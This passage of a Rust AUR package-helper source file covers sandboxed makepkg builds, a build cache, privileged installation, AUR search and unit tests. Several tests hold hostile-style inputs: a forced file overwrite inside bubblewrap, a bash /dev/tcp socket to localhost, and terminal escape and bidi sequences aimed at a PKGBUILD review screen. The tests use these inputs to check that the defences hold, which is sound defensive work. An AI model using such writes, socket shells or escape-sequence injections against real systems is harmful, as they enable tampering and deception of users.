                "Security: compiler cache directory escapes cache directory: {}",
                canonical.display()
            );
            if !mounts.contains(&canonical) {
                mounts.push(canonical);
            }
        }

        Ok(mounts)
    }

    async fn makepkg_env(&self, pkg_dir: &Path) -> Result<MakepkgEnv> {
        let client = self.clone();
        let pkg_dir = pkg_dir.to_path_buf();
        tokio::task::spawn_blocking(move || client.makepkg_env_sync(&pkg_dir))
            .await
            .context("AUR build environment task failed")?
    }

    fn makepkg_env_sync(&self, pkg_dir: &Path) -> Result<MakepkgEnv> {
        let jobs = std::thread::available_parallelism().map_or(1, std::num::NonZero::get);
        let makeflags = self
            .settings
            .aur
            .makeflags
            .clone()
            .or_else(|| std::env::var("MAKEFLAGS").ok())
            .unwrap_or_else(|| {
                if jobs > 1 {
                    format!("-j{jobs}")
                } else {
                    String::new()
                }
            });

        let pkgdest = self
            .settings
            .aur
            .pkgdest
            .clone()
            .unwrap_or_else(|| self.build_dir.join("_pkgdest"));
        let srcdest = self
            .settings
            .aur
            .srcdest
            .clone()
            .unwrap_or_else(|| self.build_dir.join("_srcdest"));

        // Build scratch lives under the user's cache directory (created
        // 0700, owned by the build user), never under world-writable /tmp:
        // a predictable /tmp path would let a local attacker pre-plant a
        // symlink and redirect the build through it.
        let builddir = paths::cache_dir().join("build").join(
            pkg_dir
                .file_name()
                .and_then(|name| name.to_str())
                .unwrap_or("pkg"),
        );

        create_dir_as_user_sync(&pkgdest)?;
        create_dir_as_user_sync(&srcdest)?;
        create_dir_as_user_sync(&builddir)?;
        // makepkg runs de-escalated inside this directory; keep it private
        // regardless of the creating process's umask. Best-effort: a failure
        // here only widens permissions, and makepkg still runs unprivileged.
        {
            use std::os::unix::fs::PermissionsExt;
            if let Err(error) =
                std::fs::set_permissions(&builddir, std::fs::Permissions::from_mode(0o700))
            {
                tracing::debug!(
                    "Failed to restrict AUR build directory {}: {error}",
                    builddir.display()
                );
            }
        }

        if crate::core::is_root()
            && let Some(build_user) = build_user()
        {
            let status = std::process::Command::new("chown")
                .arg("-R")
                .arg(&build_user)
                .arg("--")
                .arg(builddir.as_os_str())
                .status();
            match status {
                Ok(status) if status.success() => {}
                Ok(status) => tracing::warn!(
                    "Failed to chown AUR build directory {} to {build_user}: {status}",
                    builddir.display()
                ),
                Err(error) => tracing::warn!(
                    "Failed to chown AUR build directory {} to {build_user}: {error}",
                    builddir.display()
                ),
            }
        }

        let mut compiler_cache_dirs = Vec::new();
        let mut extra_env = Vec::new();

        if self.settings.aur.enable_ccache {
            let ccache_dir = self
                .settings
                .aur
                .ccache_dir
                .clone()
                .unwrap_or_else(|| self.build_dir.join("_ccache"));
            create_dir_as_user_sync(&ccache_dir)?;
            let ccache_dir = ccache_dir.canonicalize().with_context(|| {
                format!(
                    "Failed to canonicalize ccache directory: {}",
                    ccache_dir.display()
                )
            })?;
            compiler_cache_dirs.push(ccache_dir.clone());
            extra_env.push((
                "CCACHE_DIR".to_string(),
                ccache_dir.to_string_lossy().into_owned(),
            ));
            extra_env.push((
                "CCACHE_BASEDIR".to_string(),
                pkg_dir.to_string_lossy().into_owned(),
            ));
        }

        if self.settings.aur.enable_sccache {
            let sccache_dir = self
                .settings
                .aur
                .sccache_dir
                .clone()
                .unwrap_or_else(|| self.build_dir.join("_sccache"));
            create_dir_as_user_sync(&sccache_dir)?;
            let sccache_dir = sccache_dir.canonicalize().with_context(|| {
                format!(
                    "Failed to canonicalize sccache directory: {}",
                    sccache_dir.display()
                )
            })?;
            if !compiler_cache_dirs.contains(&sccache_dir) {
                compiler_cache_dirs.push(sccache_dir.clone());
            }
            extra_env.push(("RUSTC_WRAPPER".to_string(), "sccache".to_string()));
            extra_env.push((
                "SCCACHE_DIR".to_string(),
                sccache_dir.to_string_lossy().into_owned(),
            ));
        }

        Ok(MakepkgEnv {
            makeflags,
            pkgdest,
            srcdest,
            builddir,
            compiler_cache_dirs,
            extra_env,
            pgp_home: None,
        })
    }

    fn read_file_or_empty_if_missing(path: &Path) -> Result<Vec<u8>> {
        match std::fs::read(path) {
            Ok(bytes) => Ok(bytes),
            Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(Vec::new()),
            Err(error) => Err(error.into()),
        }
    }

    fn read_text_if_exists(path: &Path) -> Result<Option<String>> {
        match std::fs::read_to_string(path) {
            Ok(text) => Ok(Some(text)),
            Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(None),
            Err(error) => Err(error.into()),
        }
    }

    fn cache_key(&self, pkg_dir: &Path, makeflags: &str) -> Result<String> {
        let pkgbuild = std::fs::read(pkg_dir.join("PKGBUILD"))?;
        let srcinfo = Self::read_file_or_empty_if_missing(&pkg_dir.join(".SRCINFO"))?;
        let makepkg_args = self.makepkg_args().join(" ");
        let build_method = format!("{:?}", self.settings.aur.build_method);
        let mut hasher = Sha256::new();
        hasher.update(pkgbuild);
        hasher.update(srcinfo);
        hasher.update(makeflags.as_bytes());
        hasher.update(makepkg_args.as_bytes());
        hasher.update(build_method.as_bytes());
        hasher.update(self.settings.aur.secure_makepkg.to_string().as_bytes());
        Ok(hex::encode(hasher.finalize()))
    }

    fn cache_path(&self, package: &str) -> PathBuf {
        self.build_dir
            .join("_buildcache")
            .join(format!("{package}.hash"))
    }

    /// Look up a cached build: the hash file lives under `cache_name` (the
    /// package base) while the archive search targets the requested output
    /// artifacts, which may be split-package outputs of that base. Only
    /// archives validated against the checkout are returned.
    async fn cached_artifacts(
        &self,
        cache_name: &str,
        artifacts: &[String],
        pkg_dir: &Path,
        pkgdest: &Path,
        cache_key: &str,
    ) -> Result<Option<Vec<PathBuf>>> {
        if !self.settings.aur.cache_builds {
            return Ok(None);
        }

        let cache_name = cache_name.to_string();
        let artifacts = artifacts.to_vec();
        let pkg_dir = pkg_dir.to_path_buf();
        let pkgdest = pkgdest.to_path_buf();
        let cache_key = cache_key.to_string();
        let cache_path = self.cache_path(&cache_name);

        tokio::task::spawn_blocking(move || {
            let Some(cached) = Self::read_text_if_exists(&cache_path)? else {
                return Ok(None);
            };
            if cached.trim() != cache_key {
                return Ok(None);
            }

            Ok(
                Self::find_packages_in_dir_all(&pkgdest, &artifacts).and_then(|archives| {
                    Self::select_cached_artifacts(archives, &artifacts, &pkg_dir, &cache_name)
                }),
            )
        })
        .await?
    }

    async fn write_cache_key(&self, package: &str, cache_key: &str) -> Result<()> {
        if !self.settings.aur.cache_builds {
            return Ok(());
        }

        let cache_path = self.cache_path(package);

        if let Some(parent) = cache_path.parent() {
            create_dir_as_user(parent).await?;
        }

        let cache_key = cache_key.to_string();
        if let Some(user) = original_user() {
            let mut child = Command::new("sudo")
                .args(["-u", &user, "tee"])
                .arg(&cache_path)
                .stdin(Stdio::piped())
                .stdout(Stdio::null())
                .spawn()?;

            if let Some(mut stdin) = child.stdin.take() {
                use tokio::io::AsyncWriteExt;
                stdin.write_all(cache_key.as_bytes()).await?;
                stdin.write_all(b"\n").await?;
            }

            let status = child.wait().await?;
            if !status.success() {
                anyhow::bail!("Failed to write cache key as user '{user}'");
            }
        } else {
            tokio::task::spawn_blocking(move || {
                std::fs::write(cache_path, cache_key)?;
                Ok::<(), anyhow::Error>(())
            })
            .await??;
        }
        Ok(())
    }

    /// Install the built package via direct ALPM or elevated OMG transaction.
    async fn install_built_packages(
        pkg_paths: &[PathBuf],
        sudoloop: Option<&crate::core::sudoloop::SudoLoop>,
    ) -> Result<()> {
        if pkg_paths.is_empty() {
            anyhow::bail!("AUR build produced no package archives to install");
        }

        // Serialize database mutations across all concurrent builds.
        let _install_guard = INSTALL_LOCK.lock().await;

        // Only an already-root process may mutate ALPM directly.
        if crate::core::caps::can_write_pacman_db() {
            let packages = pkg_paths
                .iter()
                .map(|path| path.to_string_lossy().into_owned())
                .collect();
            tokio::task::spawn_blocking(move || {
                crate::package_managers::execute_transaction(
                    packages,
                    crate::package_managers::TransactionKind::InstallAurArtifact,
                    None,
                )
            })
            .await
            .context("Direct ALPM install worker failed")??;
        } else {
            // Refresh sudo credentials right before install to prevent timeout
            if let Some(sl) = sudoloop {
                sl.refresh_now().await;
            }

            let package_strs: Vec<String> = pkg_paths
                .iter()
                .map(|path| {
                    path.canonicalize()
                        .unwrap_or_else(|_| path.clone())
                        .to_string_lossy()
                        .into_owned()
                })
                .collect();
            let mut args = vec!["install", "--"];
            let pkg_refs: Vec<&str> = package_strs.iter().map(String::as_str).collect();
            args.extend(pkg_refs);
            args.push(crate::core::privilege::FLOW_PARENT_RECORDS);
            crate::core::privilege::run_privileged_child(&args).await?;
        }

        Ok(())
    }

    pub fn clean_all(&self) -> Result<()> {
        if self.build_dir.exists() {
            if let Some(user) = original_user() {
                let build_dir_str = self.build_dir.to_string_lossy();
                let status = std::process::Command::new("sudo")
                    .args(["-u", &user, "rm", "-rf", "--", build_dir_str.as_ref()])
                    .status()?;
                if !status.success() {
                    anyhow::bail!("Failed to clean directory as user '{user}'");
                }
                let status = std::process::Command::new("sudo")
                    .args(["-u", &user, "mkdir", "-p", "--", build_dir_str.as_ref()])
                    .status()?;
                if !status.success() {
                    anyhow::bail!("Failed to recreate directory as user '{user}'");
                }
            } else {
                std::fs::remove_dir_all(&self.build_dir)?;
                std::fs::create_dir_all(&self.build_dir)?;
            }
            println!(
                "{} Cleaned all AUR build directories",
                crate::cli::style::positive("✓")
            );
        }
        Ok(())
    }
}

/// Create a spinner
#[expect(clippy::literal_string_with_formatting_args, clippy::expect_used)] // Static indicatif template is always valid; braces are template syntax not Rust format args
fn create_spinner(msg: &str) -> ProgressBar {
    let pb = crate::cli::modern_ui::register_spinner(ProgressBar::new_spinner());
    pb.set_style(
        ProgressStyle::default_spinner()
            .template("{spinner:.cyan} {msg}")
            .expect("valid template"),
    );
    pb.set_message(msg.to_string());
    pb.enable_steady_tick(std::time::Duration::from_millis(100));
    pb
}

fn validate_index_entry_name(name: &str, expected: Option<&str>) -> Result<()> {
    crate::core::security::validate_package_name(name)
        .context("AUR index contains an invalid package name")?;
    if let Some(expected) = expected {
        anyhow::ensure!(
            name == expected,
            "AUR index returned unexpected package '{name}' for '{expected}'"
        );
    }
    Ok(())
}

fn validate_search_query(query: &str) -> Result<()> {
    if query.len() > AUR_SEARCH_MAX_BYTES {
        anyhow::bail!("Search query too long (max {AUR_SEARCH_MAX_BYTES} bytes)");
    }
    if query.chars().any(char::is_control) {
        anyhow::bail!("Search query contains invalid control characters");
    }
    if query.trim().len() < 2 {
        anyhow::bail!("Search query must contain at least 2 non-whitespace bytes");
    }
    Ok(())
}

/// Search AUR with detailed info
pub async fn search_detailed(query: &str) -> Result<Vec<AurPackageDetail>> {
    validate_search_query(query)?;

    let url = format!(
        "{AUR_RPC_URL}?v=5&type=search&arg={}",
        urlencoding::encode(query)
    );

    let response = shared_client()
        .get(&url)
        .send()
        .await
        .map_err(redact_aur_transport_error)?;
    let response: AurDetailedResponse = decode_aur_rpc_response(response).await?;

    // SECURITY: Validate all names in response
    let mut results = response
        .results
        .into_iter()
        .filter(|p| {
            if let Err(e) = crate::core::security::validate_package_name(&p.name) {
                tracing::warn!(
                    "Rejecting invalid package name from AUR search_detailed: {} ({})",
                    p.name,
                    e
                );
                false
            } else {
                true
            }
        })
        .collect::<Vec<_>>();

    // Rank exact, prefix, and word-boundary matches before popularity.
    let query_lower = query.to_ascii_lowercase();
    results.sort_by(|a, b| {
        let a_name_lower = a.name.to_ascii_lowercase();
        let b_name_lower = b.name.to_ascii_lowercase();

        // Exact match check
        let a_exact = a_name_lower == query_lower;
        let b_exact = b_name_lower == query_lower;
        if a_exact != b_exact {
            return b_exact.cmp(&a_exact);
        }

        // Prefix match check
        let a_prefix = a_name_lower.starts_with(&query_lower);
        let b_prefix = b_name_lower.starts_with(&query_lower);
        if a_prefix != b_prefix {
            return b_prefix.cmp(&a_prefix);
        }

        // Word boundary match check (uses module-level helper)
        let a_word = has_word_boundary_match(&a_name_lower, &query_lower);
        let b_word = has_word_boundary_match(&b_name_lower, &query_lower);
        if a_word != b_word {
            return b_word.cmp(&a_word);
        }

        // Final tiebreaker: popularity (more popular first)
        b.popularity
            .partial_cmp(&a.popularity)
            .unwrap_or(std::cmp::Ordering::Equal)
    });

    Ok(results)
}

#[derive(Debug, Deserialize)]
struct AurDetailedResponse {
    results: Vec<AurPackageDetail>,
}

#[derive(Debug, Deserialize, Clone)]
pub struct AurPackageDetail {
    #[serde(rename = "Name")]
    pub name: String,
    #[serde(rename = "Version")]
    pub version: String,
    #[serde(rename = "Description")]
    pub description: Option<String>,
    #[serde(rename = "Maintainer")]
    pub maintainer: Option<String>,
    #[serde(rename = "NumVotes")]
    pub num_votes: i32,
    #[serde(rename = "Popularity")]
    pub popularity: f64,
    #[serde(rename = "OutOfDate")]
    pub out_of_date: Option<i64>,
    #[serde(rename = "FirstSubmitted")]
    pub first_submitted: i64,
    #[serde(rename = "LastModified")]
    pub last_modified: i64,
    #[serde(rename = "URL")]
    pub url: Option<String>,
    #[serde(rename = "Depends")]
    pub depends: Option<Vec<String>>,
    #[serde(rename = "License")]
    pub license: Option<Vec<String>>,
}

#[cfg(test)]
#[expect(clippy::unwrap_used)] // Idiomatic in tests: panics on failure with clear error context
mod tests {
    use super::*;

    #[tokio::test]
    async fn aur_rpc_transport_error_redacts_query_from_display_and_sources() -> Result<()> {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await?;
        let query = "private-aur-query";
        let url = format!(
            "http://{}/rpc?v=5&type=search&arg={query}",
            listener.local_addr()?
        );
        let server = tokio::spawn(async move {
            let (stream, _) = listener.accept().await?;
            drop(stream);
            anyhow::Ok(())
        });

        let transport_error = reqwest::Client::new()
            .get(url)
            .send()
            .await
            .expect_err("closed connection must produce a transport error");
        server.await??;
        assert!(transport_error.to_string().contains(query));

        let error = redact_aur_transport_error(transport_error);
        let mut rendered_chain = error.to_string();
        let mut source = error.source();
        while let Some(cause) = source {
            rendered_chain.push_str(&cause.to_string());
            source = cause.source();
        }

        assert!(!rendered_chain.contains(query), "got: {rendered_chain}");
        assert!(!rendered_chain.contains("arg="), "got: {rendered_chain}");
        Ok(())
    }

    #[tokio::test]
    async fn rpc_info_chunk_retries_a_truncated_response_body() -> Result<()> {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};

        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await?;
        let endpoint = format!("http://{}/rpc", listener.local_addr()?);
        let server = tokio::spawn(async move {
            let (mut first, _) = listener.accept().await?;
            let mut request = [0_u8; 2048];
            let first_request_len = first.read(&mut request).await?;
            anyhow::ensure!(first_request_len > 0, "first request was empty");
            first
                .write_all(b"HTTP/1.1 200 OK\r\nContent-Length: 64\r\n\r\n{\"results\":")
                .await?;
            first.shutdown().await?;

            let (mut second, _) = listener.accept().await?;
            let second_request_len = second.read(&mut request).await?;
            anyhow::ensure!(second_request_len > 0, "second request was empty");
            let body = br#"{"type":"info","resultcount":0,"results":[]}"#;
            second
                .write_all(
                    format!("HTTP/1.1 200 OK\r\nContent-Length: {}\r\n\r\n", body.len()).as_bytes(),
                )
                .await?;
            second.write_all(body).await?;
            second.shutdown().await?;
            anyhow::Ok(())
        });

        let response = AurClient::rpc_info_chunk_at(&endpoint, &["example".to_string()]).await?;
        assert!(response.results.is_empty());
        server.await??;
        Ok(())
    }

    #[test]
    fn aur_rpc_error_envelope_is_not_an_empty_success() {
        let error = decode_aur_rpc_body::<AurResponse>(
            br#"{"type":"error","error":"Incorrect request type specified.","results":"malformed"}"#,
        )
        .expect_err("AUR RPC error envelopes must fail");

        assert!(
            error
                .to_string()
                .contains("Incorrect request type specified.")
        );
    }

    #[test]
    fn aur_rpc_success_envelope_still_decodes() {
        let response = decode_aur_rpc_body::<AurResponse>(
            br#"{"type":"search","resultcount":0,"results":[]}"#,
        )
        .expect("valid AUR RPC response");

        assert!(response.results.is_empty());
    }

    #[test]
    fn aur_rpc_http_error_uses_redacted_endpoint() {
        let error = ensure_aur_rpc_success(reqwest::StatusCode::SERVICE_UNAVAILABLE)
            .expect_err("non-success statuses must fail");
        let message = error.to_string();

        assert!(message.contains("503 Service Unavailable"));
        assert!(message.contains(AUR_RPC_URL));
        assert!(!message.contains("arg="));
    }

    fn write_tar_gz(path: &std::path::Path, entries: &[(&str, &[u8])]) {
        let encoder = flate2::write::GzEncoder::new(
            std::fs::File::create(path).unwrap(),
            flate2::Compression::fast(),
        );
        let mut tar = tar::Builder::new(encoder);
        for (name, content) in entries {
            let mut header = tar::Header::new_gnu();
            header.set_size(content.len() as u64);
            header.set_cksum();
            tar.append_data(&mut header, name, *content).unwrap();
        }
        tar.into_inner().unwrap().finish().unwrap();
    }

    #[test]
    fn pkginfo_parser_tolerates_partial_metadata_and_deduplicates_keys() {
        assert_eq!(
            AurClient::parse_pkginfo_name_version("pkgname = example\npkgver = 1.0-1\n"),
            Some(("example".to_string(), "1.0-1".to_string()))
        );
        // First occurrence wins (guards against duplicate-key takeover).
        assert_eq!(
            AurClient::parse_pkginfo_name_version(
                "pkgname = first\npkgname = second\npkgver = a\npkgver = b\n"
            ),
            Some(("first".to_string(), "a".to_string()))
        );
        // Missing either required key fails closed.
        assert_eq!(
            AurClient::parse_pkginfo_name_version("pkgname = example\n"),
            None
        );
        assert_eq!(
            AurClient::parse_pkginfo_name_version("pkgver = 1.0-1\n"),
            None
        );
        assert_eq!(
            AurClient::parse_pkginfo_name_version("desc = other stuff\n"),
            None
        );
        // Value trimming is part of the tolerated surface.
        assert_eq!(
            AurClient::parse_pkginfo_name_version("  pkgname =   spaced  \n pkgver =  2.0 \n"),
            Some(("spaced".to_string(), "2.0".to_string()))
        );
    }

    #[test]
    fn built_package_discovery_rejects_unreadable_archive_identity() {
        let directory = tempfile::tempdir().unwrap();
        let archive = directory.path().join("requested-1.0-1-x86_64.pkg.tar.zst");
        std::fs::write(&archive, b"not a package archive").unwrap();

        assert_eq!(
            AurClient::find_package_in_dir(directory.path(), &["requested".to_string()]),
            None
        );
    }

    #[test]
    fn build_only_rejects_cached_archives_with_mismatched_identity() {
        let directory = tempfile::tempdir().unwrap();
        let pkg_dir = directory.path().join("pkg");
        std::fs::create_dir(&pkg_dir).unwrap();
        std::fs::write(
            pkg_dir.join(".SRCINFO"),
            "pkgbase = requested\npkgver = 1.0\npkgrel = 1\n\npkgname = requested\n",
        )
        .unwrap();
        let archive = directory.path().join("requested.pkg.tar.gz");
        write_tar_gz(
            &archive,
            &[(".PKGINFO", b"pkgname = different\npkgver = 1.0-1\n")],
        );

        assert_eq!(
            AurClient::select_cached_artifacts(
                vec![archive],
                &["requested".to_string()],
                &pkg_dir,
                "requested"
            ),
            None
        );
    }

    #[test]
    fn archive_identity_reader_requires_a_readable_root_pkginfo() {
        let directory = tempfile::tempdir().unwrap();

        let with_pkginfo = directory.path().join("with.pkg.tar.gz");
        write_tar_gz(
            &with_pkginfo,
            &[(".PKGINFO", b"pkgname = example\npkgver = 1.0-1\n")],
        );
        assert_eq!(
            AurClient::pkg_name_and_version_from_archive(&with_pkginfo),
            Some(("example".to_string(), "1.0-1".to_string()))
        );

        // Corrupt gzip fails closed instead of yielding an identity.
        let corrupt = directory.path().join("corrupt.pkg.tar.gz");
        std::fs::write(&corrupt, b"not a gzip archive").unwrap();
        assert_eq!(AurClient::pkg_name_and_version_from_archive(&corrupt), None);

        // An archive without .PKGINFO cannot claim any identity.
        let empty = directory.path().join("empty.pkg.tar.gz");
        write_tar_gz(&empty, &[]);
        assert_eq!(AurClient::pkg_name_and_version_from_archive(&empty), None);

        // PKGINFO-like entries nested deeper than two components are ignored.
        let deep = directory.path().join("deep.pkg.tar.gz");
        write_tar_gz(
            &deep,
            &[("a/b/.PKGINFO", b"pkgname = deep\npkgver = 9.9\n")],
        );
        assert_eq!(AurClient::pkg_name_and_version_from_archive(&deep), None);

        // Metadata is untrusted and must not cause unbounded allocation.
        let oversized = directory.path().join("oversized.pkg.tar.gz");
        let mut pkginfo = b"pkgname = oversized\npkgver = 1.0-1\n".to_vec();
        pkginfo.resize((MAX_PKGINFO_BYTES + 1) as usize, b'x');
        write_tar_gz(&oversized, &[(".PKGINFO", &pkginfo)]);
        assert_eq!(
            AurClient::pkg_name_and_version_from_archive(&oversized),
            None
        );
    }

    #[test]
    fn xz_package_metadata_scan_enforces_decompressed_budget() {
        let directory = tempfile::tempdir().unwrap();
        let path = directory.path().join("oversized.pkg.tar.xz");
        let content = vec![b'x'; 1024];
        let mut tar = tar::Builder::new(Vec::new());
        let mut header = tar::Header::new_gnu();
        header.set_size(content.len() as u64);
        header.set_mode(0o644);
        header.set_cksum();
        tar.append_data(&mut header, "payload", content.as_slice())
            .unwrap();
        let raw = tar.into_inner().unwrap();
        let mut compressed = Vec::new();
        lzma_rs::xz_compress(&mut raw.as_slice(), &mut compressed).unwrap();
        std::fs::write(&path, compressed).unwrap();

        let error = AurClient::package_archive_reader(&path, 128)
            .err()
            .expect("oversized XZ output must fail before it is retained in memory");
        assert!(
            error.to_string().contains("xz"),
            "unexpected error: {error:#}"
        );
    }

    #[test]
    fn sandbox_launcher_uses_bwrap_directly_and_detaches_the_tty() {
        let command = sandbox_command(Path::new("/home/builder"), "builder");
        let command = command.as_std();
        let args: Vec<_> = command.get_args().collect();

        assert_eq!(command.get_program(), "bwrap");
        assert!(args.contains(&"--new-session".as_ref()));
        assert!(args.contains(&"--die-with-parent".as_ref()));
        assert!(args.contains(&"--unshare-pid".as_ref()));
        assert!(!args.contains(&"setsid".as_ref()));
    }

    #[cfg(target_os = "linux")]
    #[tokio::test]
    #[ignore = "requires bubblewrap and permission to create PID namespaces"]
    async fn cancelling_logged_sandbox_build_terminates_descendants() {
        use rustix::process::{Pid, PidfdFlags, Signal, pidfd_open, pidfd_send_signal};
        use tokio::io::{AsyncBufReadExt, unix::AsyncFd};

        let directory = tempfile::tempdir().expect("isolated build logs");
        let client = AurClient {
            build_dir: directory.path().to_path_buf(),
            settings: Settings::default(),
            package_base_locks: Arc::new(dashmap::DashMap::new()),
        };
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = listener.local_addr().unwrap().port().to_string();
        let log_path = client.build_log_path("fixture");
        let mut command = sandbox_command(directory.path(), "builder");
        // Keep the host /proc mount so the child can report its host PID after
        // PID isolation. Production mounts a fresh /proc instead. Do not bind
        // the whole host root: a read-only /dev makes `cmd &` fail opening
        // /dev/null, and Docker cgroup mounts break --ro-bind / /. A socket
        // provides readiness and bounds the child's lifetime if setup fails.
        command.args([
            "--ro-bind",
            "/usr",
            "/usr",
            "--ro-bind",
            "/lib",
            "/lib",
            "--ro-bind",
            "/lib64",
            "/lib64",
            "--symlink",
            "/usr/bin",
            "/bin",
            "--ro-bind",
            "/proc",
            "/proc",
            "--dev",
            "/dev",
            "--",
            "/bin/bash",
            "-c",
        ]);
        command.arg(
            r#"/bin/bash -c '
                exec 3<>/dev/tcp/127.0.0.1/"$1" || exit 1
                read -r host_pid rest < /proc/self/stat
                printf "%s\n" "$host_pid" >&3
                read -r -t 30 finish <&3
            ' child "$1" & wait"#,
        );
        command.arg("build").arg(port).stdin(Stdio::null());
        let mut runner = tokio::spawn(async move {
            client
                .run_logged_build_command(&mut command, "fixture")
                .await
        });
        let _abort_runner = scopeguard::guard(runner.abort_handle(), |handle| handle.abort());
        let (stream, _) = tokio::select! {
            result = tokio::time::timeout(Duration::from_secs(5), listener.accept()) => {
                result.expect("build child must signal readiness").expect("accept readiness")
            }
            result = &mut runner => {
                let log = std::fs::read_to_string(&log_path).unwrap_or_default();
                panic!("sandbox exited before child readiness: {result:?}\nlog:\n{log}");
            }
        };
        let mut readiness = tokio::io::BufReader::new(stream);
        let mut pid = String::new();
        tokio::time::timeout(Duration::from_secs(5), readiness.read_line(&mut pid))
            .await
            .unwrap()
            .unwrap();
        let pid =
            Pid::from_raw(pid.trim().parse().expect("child host PID")).expect("nonzero child PID");
        let exit = AsyncFd::new(pidfd_open(pid, PidfdFlags::NONBLOCK).unwrap()).unwrap();
        let _cleanup_child = scopeguard::guard(&exit, |exit| {
            // The failed regression must not leak its fixture. A pidfd
            // cannot accidentally signal an unrelated process after PID reuse.
            let _ = pidfd_send_signal(exit.get_ref(), Signal::KILL);
        });

        runner.abort();
        assert!(
            runner
                .await
                .expect_err("runner must be cancelled")
                .is_cancelled()
        );
        let _exited = tokio::time::timeout(Duration::from_secs(2), exit.readable())
            .await
            .expect("cancelling a sandbox build must terminate its compiler descendants")
            .expect("observe child exit");
    }

    #[test]
    fn sandbox_mounts_external_resolver_target() {
        let resolver = std::fs::canonicalize("/etc/resolv.conf").unwrap();
        if resolver.starts_with("/etc") {
            return;
        }

        let mut command = Command::new("bwrap");
        configure_sandbox_resolver(&mut command).unwrap();
        let args: Vec<_> = command.as_std().get_args().collect();

        assert!(args.contains(&resolver.as_os_str()));
        assert!(
            resolver
                .parent()
                .is_some_and(|parent| args.contains(&parent.as_os_str()))
        );
    }

    /// A host without a usable resolver (container, chroot, dangling
    /// /etc/resolv.conf symlink) must not fail every AUR build at sandbox
    /// setup; there is simply nothing to mount.
    #[test]
    fn sandbox_resolver_setup_skips_when_the_host_has_no_resolver() {
        let temp = tempfile::tempdir().unwrap();

        let missing = temp.path().join("resolv.conf");
        let mut command = Command::new("bwrap");
        configure_sandbox_resolver_at(&mut command, &missing).unwrap();
        assert_eq!(command.as_std().get_args().count(), 0);

        // Same for a dangling symlink (e.g. points into an unmounted /run).
        let dangling = temp.path().join("dangling");
        std::os::unix::fs::symlink(temp.path().join("unmounted/run/resolv.conf"), &dangling)
            .unwrap();
        let mut command = Command::new("bwrap");
        configure_sandbox_resolver_at(&mut command, &dangling).unwrap();
        assert_eq!(command.as_std().get_args().count(), 0);
    }

    /// Verify that bubblewrap's read-only root bind blocks writes outside
    /// the writable mounts our sandbox configures.
    ///
    /// This tests bwrap itself with representative args, NOT the production
    /// argument list built by `run_sandboxed_makepkg` (which cannot be run
    /// hermetically in a unit test). The production args are covered by the
    /// path-validation unit tests (`validate_path_inside`, `is_symlink`).
    #[tokio::test]
    async fn bwrap_readonly_root_blocks_arbitrary_writes() {
        // We can't call run_sandboxed_makepkg directly without a full build
        // environment, so exercise bwrap's ro-bind guarantee directly.

        let bwrap_path = which::which("bwrap");
        if bwrap_path.is_err() {
            println!("Skipping sandbox test: bubblewrap not installed");
            return;
        }

        // Create a dummy file to try to overwrite
        let temp_dir = tempfile::TempDir::new().unwrap();
        let sensitive_file = temp_dir.path().join("sensitive.txt");
        std::fs::write(&sensitive_file, "secret").unwrap();

        // Try to overwrite it from inside the sandbox
        // The sandbox mounts / as read-only by default except for specific paths
        // We need to verify that an arbitrary path is NOT writable

        let status = Command::new("bwrap")
            .args([
                "--ro-bind",
                "/",
                "/",
                "--dev",
                "/dev",
                "--proc",
                "/proc",
                "--tmpfs",
                "/tmp",
                "--command",
                "/bin/sh",
                "-c",
                &format!("echo hacked > {}", sensitive_file.display()),
            ])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
            .await
            .unwrap();

        // Should fail because / is read-only
        assert!(
            !status.success(),
            "Sandbox should prevent writing to arbitrary files"
        );
    }

    #[tokio::test]
    async fn sandbox_fakeroot_skips_unmappable_real_chown() {
        if which::which("bwrap").is_err() || which::which("fakeroot").is_err() {
            return;
        }

        let temp = tempfile::tempdir().unwrap();
        let source = temp.path().join("source");
        let destination = temp.path().join("destination");
        std::fs::create_dir_all(source.join("nested")).unwrap();
        std::fs::create_dir_all(&destination).unwrap();
        std::fs::write(source.join("nested/file"), "payload").unwrap();

        let mut command = Command::new("bwrap");
        command.args([
            "--clearenv",
            "--ro-bind",
            "/",
            "/",
            "--tmpfs",
            "/tmp",
            "--bind",
        ]);
        command.arg(temp.path()).arg(temp.path());
        command.args(["--chdir"]);
        command.arg(temp.path());
        command.args([
            "--setenv",
            "PATH",
            "/usr/local/sbin:/usr/local/bin:/usr/bin",
            "--setenv",
            SANDBOX_FAKEROOT_ENV.0,
            SANDBOX_FAKEROOT_ENV.1,
            "--",
            "fakeroot",
            "sh",
            "-c",
            concat!(
                "chown -R 0:0 source && ",
                "test \"$(stat -c '%u:%g' source/nested/file)\" = 0:0 && ",
                "cp -a source/. destination/copied && ",
                "test \"$(stat -c '%u:%g' destination/copied/nested/file)\" = 0:0",
            ),
        ]);

        let status = command.status().await.unwrap();
        assert!(status.success());
        assert_eq!(
            std::fs::read_to_string(destination.join("copied/nested/file")).unwrap(),
            "payload"
        );
    }

    #[test]
    fn pkgbuild_review_is_bounded_and_terminal_safe() {
        let rendered = pkgbuild_review_text(b"pkgname=safe\n\x1b]52;c;secret\x07\n")
            .expect("small PKGBUILD must render");
        assert_eq!(rendered, "pkgname=safe\n]52;c;secret\n");

        let bidi = pkgbuild_review_text(b"pkgname=safe\n\xe2\x80\xaao\xe2\x81\xa7i\n")
            .expect("PKGBUILD with bidi characters must render");
        assert_eq!(bidi, "pkgname=safe\noi\n");

        let oversized = vec![b'x'; MAX_PKGBUILD_REVIEW_BYTES + 1];
        let error = pkgbuild_review_text(&oversized)
            .expect_err("oversized PKGBUILD must fail before terminal rendering");
        assert!(error.to_string().contains("review limit"));
    }

    #[test]
    fn pkgbuild_review_panel_is_inline_and_package_specific() {
        let review = "pkgname=google-chrome\npkgver=140.0\n";
        let digest = pkgbuild_digest(review.as_bytes());
        let panel = pkgbuild_review_panel("google-chrome", &digest, review);

        assert!(panel.contains("AUR"));
        assert!(panel.contains("Review google-chrome"));
        assert!(panel.contains(&format!("SHA-256 {digest}")));
        assert!(panel.contains("pkgname=google-chrome"));
        assert_eq!(
            pkgbuild_review_prompt("google-chrome"),
            "Build google-chrome from this PKGBUILD?"
        );
    }

    #[tokio::test]
    async fn parallel_pkgbuild_reviews_share_a_single_gate() {
